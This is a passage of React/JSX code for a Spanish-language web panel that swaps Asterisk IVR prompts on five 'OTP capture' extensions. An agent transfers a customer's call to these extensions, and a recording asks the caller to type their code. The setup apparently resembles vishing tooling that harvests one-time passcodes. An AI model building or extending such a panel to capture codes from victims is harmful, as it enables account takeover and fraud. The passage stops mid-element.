          <p className="text-sm text-slate-400">
            Controla y cambia los audios pregrabados en tiempo real desde la web. Cada cambio se aplica inmediatamente en <strong>Asterisk AstDB</strong> sin necesidad de reiniciar la central.
          </p>
        </div>

        <div className="flex items-center gap-2 flex-wrap">
          <button
            onClick={fetchActiveAssignments}
            className="inline-flex items-center space-x-1.5 px-3 py-2 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-colors"
            title="Recargar estado actual de audios desde Asterisk AstDB"
          >
            <RefreshCw className="w-3.5 h-3.5 text-slate-400" />
            <span>Actualizar Estado</span>
          </button>

          {isRecording ? (
            <button
              onClick={stopRecording}
              className="inline-flex items-center space-x-2 px-4 py-2 rounded-lg text-sm font-semibold bg-rose-600 hover:bg-rose-500 text-white shadow-md animate-pulse"
            >
              <Square className="w-4 h-4" />
              <span>Detener Grabación ({recordingTime}s)</span>
            </button>
          ) : (
            <button
              onClick={startRecording}
              className="inline-flex items-center space-x-1.5 px-3.5 py-2 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
              title="Grabar locución directamente desde el micrófono"
            >
              <Mic className="w-4 h-4 text-rose-400" />
              <span>Grabar Micrófono</span>
            </button>
          )}

          <button
            onClick={() => fileInputRef.current?.click()}
            className="inline-flex items-center space-x-2 px-4 py-2 rounded-lg text-sm font-semibold bg-emerald-500 hover:bg-emerald-400 text-black shadow-md shadow-emerald-500/20 font-bold"
          >
            <UploadCloud className="w-4 h-4" />
            <span>Subir Audio Pregrabado</span>
          </button>
          <input
            type="file"
            ref={fileInputRef}
            onChange={handleFileInputChange}
            accept="audio/*,.wav,.mp3,.ogg,.gsm"
            className="hidden"
          />
        </div>
      </div>

      {/* Floating feedback message */}
      {feedbackMsg && (
        <div
          className={`p-3 rounded-xl border flex items-center justify-between gap-3 text-xs transition-all ${
            feedbackMsg.type === 'success'
              ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
              : 'bg-blue-500/10 border-blue-500/30 text-blue-300'
          }`}
        >
          <div className="flex items-center gap-2">
            <CheckCircle className="w-4 h-4 shrink-0" />
            <span>{feedbackMsg.text}</span>
          </div>
          <button
            onClick={() => setFeedbackMsg(null)}
            className="text-slate-400 hover:text-white font-mono"
          >
            &times;
          </button>
        </div>
      )}

      {/* SECTION 1: PANELES DESTACADOS PARA EXTENSIONES 7777, 6666, 5555, 4444 Y 3333 */}
      <div className="space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-slate-900/90 p-3.5 rounded-xl border border-slate-800">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-indigo-500/20 border border-indigo-500/30 flex items-center justify-center text-indigo-300">
              <Headphones className="w-4 h-4" />
            </div>
            <div>
              <h3 className="text-sm font-bold text-white">
                Extensiones Dedicadas de Captura en Vivo (7777, 6666, 5555, 4444 y 3333)
              </h3>
              <p className="text-xs text-slate-400">
                Transfiere la llamada del cliente a cualquiera de las extensiones <strong className="text-purple-300">7777</strong>, <strong className="text-cyan-300">6666</strong>, <strong className="text-amber-300">5555</strong>, <strong className="text-emerald-300">4444</strong> o <strong className="text-pink-300">3333</strong>. Todas capturan el código con validación del agente y cuentan con locuciones 100% independientes.
              </p>
            </div>
          </div>
          <div className="flex items-center gap-2 self-start sm:self-auto flex-wrap">
            <button
              onClick={handleSaveOtpExtensions}
              disabled={isSavingOtpExtensions}
              className={`px-3.5 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shadow-md ${
                otpExtensionsSaved
                  ? 'bg-emerald-500 text-black shadow-emerald-500/20 ring-2 ring-emerald-400'
                  : 'bg-gradient-to-r from-purple-600 via-emerald-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white shadow-purple-600/20'
              }`}
              title="Guardar y bloquear permanentemente las locuciones de todas las extensiones OTP para que no cambien al sincronizar el sistema"
            >
              {otpExtensionsSaved ? <Check className="w-3.5 h-3.5 text-black" /> : <Lock className="w-3.5 h-3.5" />}
              <span>{isSavingOtpExtensions ? 'Guardando en AstDB...' : otpExtensionsSaved ? '¡Configuración Bloqueada!' : 'Guardar y Bloquear Extensiones OTP'}</span>
            </button>

            {/* Menú de selección individual de extensiones */}
            <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs flex-wrap">
              <button
                onClick={() => setFeaturedExtTab('all')}
                className={`px-2.5 py-1 rounded transition-colors font-medium ${
                  featuredExtTab === 'all'
                    ? 'bg-indigo-600 text-white font-bold shadow-sm'
                    : 'text-slate-400 hover:text-white'
                }`}
              >
                Ver Todas (5)
              </button>
              <button
                onClick={() => setFeaturedExtTab('7777')}
                className={`px-2.5 py-1 rounded transition-colors font-medium ${
                  featuredExtTab === '7777'
                    ? 'bg-purple-600 text-white font-bold shadow-sm'
                    : 'text-slate-400 hover:text-purple-300'
                }`}
              >
                Ext. 7777
              </button>
              <button
                onClick={() => setFeaturedExtTab('6666')}
                className={`px-2.5 py-1 rounded transition-colors font-medium ${
                  featuredExtTab === '6666'
                    ? 'bg-cyan-600 text-white font-bold shadow-sm'
                    : 'text-slate-400 hover:text-cyan-300'
                }`}
              >
                Ext. 6666
              </button>
              <button
                onClick={() => setFeaturedExtTab('5555')}
                className={`px-2.5 py-1 rounded transition-colors font-medium ${
                  featuredExtTab === '5555'
                    ? 'bg-amber-600 text-white font-bold shadow-sm'
                    : 'text-slate-400 hover:text-amber-300'
                }`}
              >
                Ext. 5555
              </button>
              <button
                onClick={() => setFeaturedExtTab('4444')}
                className={`px-2.5 py-1 rounded transition-colors font-medium ${
                  featuredExtTab === '4444'
                    ? 'bg-emerald-600 text-white font-bold shadow-sm'
                    : 'text-slate-400 hover:text-emerald-300'
                }`}
              >
                Ext. 4444
              </button>
              <button
                onClick={() => setFeaturedExtTab('3333')}
                className={`px-2.5 py-1 rounded transition-colors font-medium ${
                  featuredExtTab === '3333'
                    ? 'bg-pink-600 text-white font-bold shadow-sm'
                    : 'text-slate-400 hover:text-pink-300'
                }`}
              >
                Ext. 3333
              </button>
            </div>
          </div>
        </div>

        {/* PANEL EXTENSIÓN 7777 */}
        {(featuredExtTab === 'all' || featuredExtTab === '7777') && (
          <div className="p-6 rounded-2xl bg-gradient-to-br from-purple-950/50 via-slate-900 to-slate-950 border-2 border-purple-500/50 shadow-xl space-y-4">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-purple-500/20">
              <div className="flex items-start gap-3">
                <div className="w-11 h-11 rounded-xl bg-purple-500/20 border border-purple-500/40 flex items-center justify-center text-purple-300 shrink-0 shadow-inner">
                  <Headphones className="w-6 h-6" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-base font-bold text-white">
                      Audio Exclusivo para Extensión 7777 / 777
                    </h3>
                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-purple-500 text-white shadow-sm">
                      Captura OTP Primaria
                    </span>
                  </div>
                  <p className="text-xs text-purple-200/80 mt-1">
                    Audio reproducido al cliente cuando transfieres a la 7777: <span className="font-semibold text-white">"Por favor digite su código seguido de la tecla de número (#)"</span>.
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <input
                  type="file"
                  ref={ext7777FileInputRef}
                  onChange={(e) => {
                    if (e.target.files && e.target.files[0]) {
                      handleUpload7777Direct(e.target.files[0]);
                    }
                  }}
                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
                  className="hidden"
                />
                <button
                  onClick={() => ext7777FileInputRef.current?.click()}
                  disabled={isUploading7777}
                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-purple-500 hover:bg-purple-400 text-white shadow-lg shadow-purple-500/30 transition-all transform active:scale-95 disabled:opacity-50"
                >
                  <UploadCloud className="w-4 h-4" />
                  <span>{isUploading7777 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 7777'}</span>
                </button>
              </div>
            </div>

            {/* Zona de estado y selector rápido para la 7777 */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-purple-500/30 space-y-2.5">
                <div className="flex items-center justify-between text-xs">
                  <span className="text-slate-300 font-semibold">Audio asignado a la 7777 / 777:</span>
                  <span className="font-mono text-purple-300 font-bold bg-purple-950/60 px-2 py-0.5 rounded border border-purple-800/50">
                    {activeAssignments.welcome_7777 || 'custom/bienvenida_7777'}
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  <select
                    value={activeAssignments.welcome_7777 || 'custom/bienvenida_7777'}
                    disabled={isSyncingRole.welcome_7777}
                    onChange={(e) => handleAssignRoleDirect('welcome_7777', e.target.value)}
                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-purple-500/40 text-slate-100 text-xs font-mono focus:border-purple-400 focus:outline-none"
                  >
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>

                  <button
                    onClick={() => handlePlayByPath(activeAssignments.welcome_7777 || 'custom/bienvenida_7777')}
                    className="px-3.5 py-2 rounded-lg bg-purple-600 hover:bg-purple-500 text-white text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-purple-600/20"
                    title="Escuchar audio actual de la 7777"
                  >
                    <Play className="w-3.5 h-3.5" />
                    <span>Escuchar</span>
                  </button>

                  <button
                    onClick={() => handleDeactivateRole('welcome_7777')}
                    disabled={isSyncingRole.welcome_7777}
                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
                    title="Desactivar audio actual y restaurar locución predeterminada para la 7777"
                  >
                    <PowerOff className="w-3.5 h-3.5" />
                    <span className="hidden sm:inline">Desactivar</span>
                  </button>
                </div>

                <div className="flex items-center justify-between text-[11px] text-slate-400">
                  <span className="flex items-center gap-1.5 text-emerald-400">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>AstDB: ivr_vars 7777_intro y ivr_vars 7777_prompt</span>
                  </span>
                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
                </div>
              </div>

              <div
                onDragOver={(e) => {
                  e.preventDefault();
                  setIsDragging(true);
                }}
                onDragLeave={() => setIsDragging(false)}
                onDrop={(e) => {
                  e.preventDefault();
                  setIsDragging(false);
                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                    handleUpload7777Direct(e.dataTransfer.files[0]);
                  }
                }}
                onClick={() => ext7777FileInputRef.current?.click()}
                className="p-4 rounded-xl border-2 border-dashed border-purple-500/40 bg-purple-950/20 hover:bg-purple-950/40 hover:border-purple-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
              >
                <UploadCloud className="w-6 h-6 text-purple-400" />
                <div className="text-xs font-bold text-white">Arrastra el audio de la 7777 aquí</div>
                <p className="text-[10px] text-purple-300/70 leading-tight">
                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* PANEL EXTENSIÓN 6666 */}
        {(featuredExtTab === 'all' || featuredExtTab === '6666') && (
          <div className="p-6 rounded-2xl bg-gradient-to-br from-cyan-950/50 via-slate-900 to-slate-950 border-2 border-cyan-500/50 shadow-xl space-y-4">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-cyan-500/20">
              <div className="flex items-start gap-3">
                <div className="w-11 h-11 rounded-xl bg-cyan-500/20 border border-cyan-500/40 flex items-center justify-center text-cyan-300 shrink-0 shadow-inner">
                  <Headphones className="w-6 h-6" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-base font-bold text-white">
                      Audio Exclusivo para Extensión 6666 / 666
                    </h3>
                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-cyan-500 text-black shadow-sm">
                      Extensión OTP 6666
                    </span>
                  </div>
                  <p className="text-xs text-cyan-200/80 mt-1">
                    Audio reproducido al cliente cuando transfieres a la 6666: <span className="font-semibold text-white">Locución personalizada con misma lógica y flujo de validación</span>.
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <input
                  type="file"
                  ref={ext6666FileInputRef}
                  onChange={(e) => {
                    if (e.target.files && e.target.files[0]) {
                      handleUpload6666Direct(e.target.files[0]);
                    }
                  }}
                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
                  className="hidden"
                />
                <button
                  onClick={() => ext6666FileInputRef.current?.click()}
                  disabled={isUploading6666}
                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-cyan-500 hover:bg-cyan-400 text-black shadow-lg shadow-cyan-500/30 transition-all transform active:scale-95 disabled:opacity-50"
                >
                  <UploadCloud className="w-4 h-4" />
                  <span>{isUploading6666 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 6666'}</span>
                </button>
              </div>
            </div>

            {/* Zona de estado y selector rápido para la 6666 */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-cyan-500/30 space-y-2.5">
                <div className="flex items-center justify-between text-xs">
                  <span className="text-slate-300 font-semibold">Audio asignado a la 6666 / 666:</span>
                  <span className="font-mono text-cyan-300 font-bold bg-cyan-950/60 px-2 py-0.5 rounded border border-cyan-800/50">
                    {activeAssignments.welcome_6666 || 'custom/bienvenida_6666'}
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  <select
                    value={activeAssignments.welcome_6666 || 'custom/bienvenida_6666'}
                    disabled={isSyncingRole.welcome_6666}
                    onChange={(e) => handleAssignRoleDirect('welcome_6666', e.target.value)}
                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-cyan-500/40 text-slate-100 text-xs font-mono focus:border-cyan-400 focus:outline-none"
                  >
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>

                  <button
                    onClick={() => handlePlayByPath(activeAssignments.welcome_6666 || 'custom/bienvenida_6666')}
                    className="px-3.5 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-black text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-cyan-600/20"
                    title="Escuchar audio actual de la 6666"
                  >
                    <Play className="w-3.5 h-3.5" />
                    <span>Escuchar</span>
                  </button>

                  <button
                    onClick={() => handleDeactivateRole('welcome_6666')}
                    disabled={isSyncingRole.welcome_6666}
                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
                    title="Desactivar audio actual y restaurar locución predeterminada para la 6666"
                  >
                    <PowerOff className="w-3.5 h-3.5" />
                    <span className="hidden sm:inline">Desactivar</span>
                  </button>
                </div>

                <div className="flex items-center justify-between text-[11px] text-slate-400">
                  <span className="flex items-center gap-1.5 text-emerald-400">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>AstDB: ivr_vars 6666_intro y ivr_vars 6666_prompt</span>
                  </span>
                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
                </div>
              </div>

              <div
                onDragOver={(e) => {
                  e.preventDefault();
                  setIsDragging(true);
                }}
                onDragLeave={() => setIsDragging(false)}
                onDrop={(e) => {
                  e.preventDefault();
                  setIsDragging(false);
                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                    handleUpload6666Direct(e.dataTransfer.files[0]);
                  }
                }}
                onClick={() => ext6666FileInputRef.current?.click()}
                className="p-4 rounded-xl border-2 border-dashed border-cyan-500/40 bg-cyan-950/20 hover:bg-cyan-950/40 hover:border-cyan-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
              >
                <UploadCloud className="w-6 h-6 text-cyan-400" />
                <div className="text-xs font-bold text-white">Arrastra el audio de la 6666 aquí</div>
                <p className="text-[10px] text-cyan-300/70 leading-tight">
                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* PANEL EXTENSIÓN 5555 */}
        {(featuredExtTab === 'all' || featuredExtTab === '5555') && (
          <div className="p-6 rounded-2xl bg-gradient-to-br from-amber-950/50 via-slate-900 to-slate-950 border-2 border-amber-500/50 shadow-xl space-y-4">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-amber-500/20">
              <div className="flex items-start gap-3">
                <div className="w-11 h-11 rounded-xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-300 shrink-0 shadow-inner">
                  <Headphones className="w-6 h-6" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-base font-bold text-white">
                      Audio Exclusivo para Extensión 5555 / 555
                    </h3>
                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-amber-500 text-slate-950 shadow-sm">
                      Extensión OTP 5555
                    </span>
                  </div>
                  <p className="text-xs text-amber-200/80 mt-1">
                    Audio reproducido al cliente cuando transfieres a la 5555: <span className="font-semibold text-white">Mismas características que la 7777 con locución independiente</span>.
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <input
                  type="file"
                  ref={ext5555FileInputRef}
                  onChange={(e) => {
                    if (e.target.files && e.target.files[0]) {
                      handleUpload5555Direct(e.target.files[0]);
                    }
                  }}
                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
                  className="hidden"
                />
                <button
                  onClick={() => ext5555FileInputRef.current?.click()}
                  disabled={isUploading5555}
                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 shadow-lg shadow-amber-500/30 transition-all transform active:scale-95 disabled:opacity-50"
                >
                  <UploadCloud className="w-4 h-4" />
                  <span>{isUploading5555 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 5555'}</span>
                </button>
              </div>
            </div>

            {/* Zona de estado y selector rápido para la 5555 */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-amber-500/30 space-y-2.5">
                <div className="flex items-center justify-between text-xs">
                  <span className="text-slate-300 font-semibold">Audio asignado a la 5555 / 555:</span>
                  <span className="font-mono text-amber-300 font-bold bg-amber-950/60 px-2 py-0.5 rounded border border-amber-800/50">
                    {activeAssignments.welcome_5555 || 'custom/bienvenida_5555'}
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  <select
                    value={activeAssignments.welcome_5555 || 'custom/bienvenida_5555'}
                    disabled={isSyncingRole.welcome_5555}
                    onChange={(e) => handleAssignRoleDirect('welcome_5555', e.target.value)}
                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-amber-500/40 text-slate-100 text-xs font-mono focus:border-amber-400 focus:outline-none"
                  >
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>

                  <button
                    onClick={() => handlePlayByPath(activeAssignments.welcome_5555 || 'custom/bienvenida_5555')}
                    className="px-3.5 py-2 rounded-lg bg-amber-600 hover:bg-amber-500 text-slate-950 text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-amber-600/20"
                    title="Escuchar audio actual de la 5555"
                  >
                    <Play className="w-3.5 h-3.5" />
                    <span>Escuchar</span>
                  </button>

                  <button
                    onClick={() => handleDeactivateRole('welcome_5555')}
                    disabled={isSyncingRole.welcome_5555}
                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
                    title="Desactivar audio actual y restaurar locución predeterminada para la 5555"
                  >
                    <PowerOff className="w-3.5 h-3.5" />
                    <span className="hidden sm:inline">Desactivar</span>
                  </button>
                </div>

                <div className="flex items-center justify-between text-[11px] text-slate-400">
                  <span className="flex items-center gap-1.5 text-emerald-400">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>AstDB: ivr_vars 5555_intro y ivr_vars 5555_prompt</span>
                  </span>
                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
                </div>
              </div>

              <div
                onDragOver={(e) => {
                  e.preventDefault();
                  setIsDragging(true);
                }}
                onDragLeave={() => setIsDragging(false)}
                onDrop={(e) => {
                  e.preventDefault();
                  setIsDragging(false);
                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                    handleUpload5555Direct(e.dataTransfer.files[0]);
                  }
                }}
                onClick={() => ext5555FileInputRef.current?.click()}
                className="p-4 rounded-xl border-2 border-dashed border-amber-500/40 bg-amber-950/20 hover:bg-amber-950/40 hover:border-amber-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
              >
                <UploadCloud className="w-6 h-6 text-amber-400" />
                <div className="text-xs font-bold text-white">Arrastra el audio de la 5555 aquí</div>
                <p className="text-[10px] text-amber-300/70 leading-tight">
                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* PANEL EXTENSIÓN 4444 */}
        {(featuredExtTab === 'all' || featuredExtTab === '4444') && (
          <div className="p-6 rounded-2xl bg-gradient-to-br from-emerald-950/50 via-slate-900 to-slate-950 border-2 border-emerald-500/50 shadow-xl space-y-4">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-emerald-500/20">
              <div className="flex items-start gap-3">
                <div className="w-11 h-11 rounded-xl bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-300 shrink-0 shadow-inner">
                  <Headphones className="w-6 h-6" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-base font-bold text-white">
                      Audio Exclusivo para Extensión 4444 / 444
                    </h3>
                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-emerald-500 text-slate-950 shadow-sm">
                      Extensión OTP 4444
                    </span>
                  </div>
                  <p className="text-xs text-emerald-200/80 mt-1">
                    Audio reproducido al cliente cuando transfieres a la 4444: <span className="font-semibold text-white">Mismas características que la 7777 con locución independiente</span>.
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <input
                  type="file"
                  ref={ext4444FileInputRef}
                  onChange={(e) => {
                    if (e.target.files && e.target.files[0]) {
                      handleUpload4444Direct(e.target.files[0]);
                    }
                  }}
                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
                  className="hidden"
                />
                <button
                  onClick={() => ext4444FileInputRef.current?.click()}
                  disabled={isUploading4444}
                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-emerald-500 hover:bg-emerald-400 text-slate-950 shadow-lg shadow-emerald-500/30 transition-all transform active:scale-95 disabled:opacity-50"
                >
                  <UploadCloud className="w-4 h-4" />
                  <span>{isUploading4444 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 4444'}</span>
                </button>
              </div>
            </div>

            {/* Zona de estado y selector rápido para la 4444 */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-emerald-500/30 space-y-2.5">
                <div className="flex items-center justify-between text-xs">
                  <span className="text-slate-300 font-semibold">Audio asignado a la 4444 / 444:</span>
                  <span className="font-mono text-emerald-300 font-bold bg-emerald-950/60 px-2 py-0.5 rounded border border-emerald-800/50">
                    {activeAssignments.welcome_4444 || 'custom/bienvenida_4444'}
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  <select
                    value={activeAssignments.welcome_4444 || 'custom/bienvenida_4444'}
                    disabled={isSyncingRole.welcome_4444}
                    onChange={(e) => handleAssignRoleDirect('welcome_4444', e.target.value)}
                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-emerald-500/40 text-slate-100 text-xs font-mono focus:border-emerald-400 focus:outline-none"
                  >
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>

                  <button
                    onClick={() => handlePlayByPath(activeAssignments.welcome_4444 || 'custom/bienvenida_4444')}
                    className="px-3.5 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-slate-950 text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-emerald-600/20"
                    title="Escuchar audio actual de la 4444"
                  >
                    <Play className="w-3.5 h-3.5" />
                    <span>Escuchar</span>
                  </button>

                  <button
                    onClick={() => handleDeactivateRole('welcome_4444')}
                    disabled={isSyncingRole.welcome_4444}
                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
                    title="Desactivar audio actual y restaurar locución predeterminada para la 4444"
                  >
                    <PowerOff className="w-3.5 h-3.5" />
                    <span className="hidden sm:inline">Desactivar</span>
                  </button>
                </div>

                <div className="flex items-center justify-between text-[11px] text-slate-400">
                  <span className="flex items-center gap-1.5 text-emerald-400">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>AstDB: ivr_vars 4444_intro y ivr_vars 4444_prompt</span>
                  </span>
                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
                </div>
              </div>

              <div
                onDragOver={(e) => {
                  e.preventDefault();
                  setIsDragging(true);
                }}
                onDragLeave={() => setIsDragging(false)}
                onDrop={(e) => {
                  e.preventDefault();
                  setIsDragging(false);
                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                    handleUpload4444Direct(e.dataTransfer.files[0]);
                  }
                }}
                onClick={() => ext4444FileInputRef.current?.click()}
                className="p-4 rounded-xl border-2 border-dashed border-emerald-500/40 bg-emerald-950/20 hover:bg-emerald-950/40 hover:border-emerald-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
              >
                <UploadCloud className="w-6 h-6 text-emerald-400" />
                <div className="text-xs font-bold text-white">Arrastra el audio de la 4444 aquí</div>
                <p className="text-[10px] text-emerald-300/70 leading-tight">
                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* PANEL EXTENSIÓN 3333 */}
        {(featuredExtTab === 'all' || featuredExtTab === '3333') && (
          <div className="p-6 rounded-2xl bg-gradient-to-br from-pink-950/50 via-slate-900 to-slate-950 border-2 border-pink-500/50 shadow-xl space-y-4">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-pink-500/20">
              <div className="flex items-start gap-3">
                <div className="w-11 h-11 rounded-xl bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-pink-300 shrink-0 shadow-inner">
                  <Headphones className="w-6 h-6" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-base font-bold text-white">
                      Audio Exclusivo para Extensión 3333 / 333
                    </h3>
                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-pink-500 text-white shadow-sm">
                      Extensión OTP 3333
                    </span>
                  </div>
                  <p className="text-xs text-pink-200/80 mt-1">
                    Audio reproducido al cliente cuando transfieres a la 3333: <span className="font-semibold text-white">Mismas características que la 7777 con locución independiente</span>.
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <input
                  type="file"
                  ref={ext3333FileInputRef}
                  onChange={(e) => {
                    if (e.target.files && e.target.files[0]) {
                      handleUpload3333Direct(e.target.files[0]);
                    }
                  }}
                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
                  className="hidden"
                />
                <button
                  onClick={() => ext3333FileInputRef.current?.click()}
                  disabled={isUploading3333}
                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-pink-500 hover:bg-pink-400 text-white shadow-lg shadow-pink-500/30 transition-all transform active:scale-95 disabled:opacity-50"
                >
                  <UploadCloud className="w-4 h-4" />
                  <span>{isUploading3333 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 3333'}</span>
                </button>
              </div>
            </div>

            {/* Zona de estado y selector rápido para la 3333 */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-pink-500/30 space-y-2.5">
                <div className="flex items-center justify-between text-xs">
                  <span className="text-slate-300 font-semibold">Audio asignado a la 3333 / 333:</span>
                  <span className="font-mono text-pink-300 font-bold bg-pink-950/60 px-2 py-0.5 rounded border border-pink-800/50">
                    {activeAssignments.welcome_3333 || 'custom/bienvenida_3333'}
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  <select
                    value={activeAssignments.welcome_3333 || 'custom/bienvenida_3333'}
                    disabled={isSyncingRole.welcome_3333}
                    onChange={(e) => handleAssignRoleDirect('welcome_3333', e.target.value)}
                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-pink-500/40 text-slate-100 text-xs font-mono focus:border-pink-400 focus:outline-none"
                  >
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>

                  <button
                    onClick={() => handlePlayByPath(activeAssignments.welcome_3333 || 'custom/bienvenida_3333')}
                    className="px-3.5 py-2 rounded-lg bg-pink-600 hover:bg-pink-500 text-white text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-pink-600/20"
                    title="Escuchar audio actual de la 3333"
                  >
                    <Play className="w-3.5 h-3.5" />
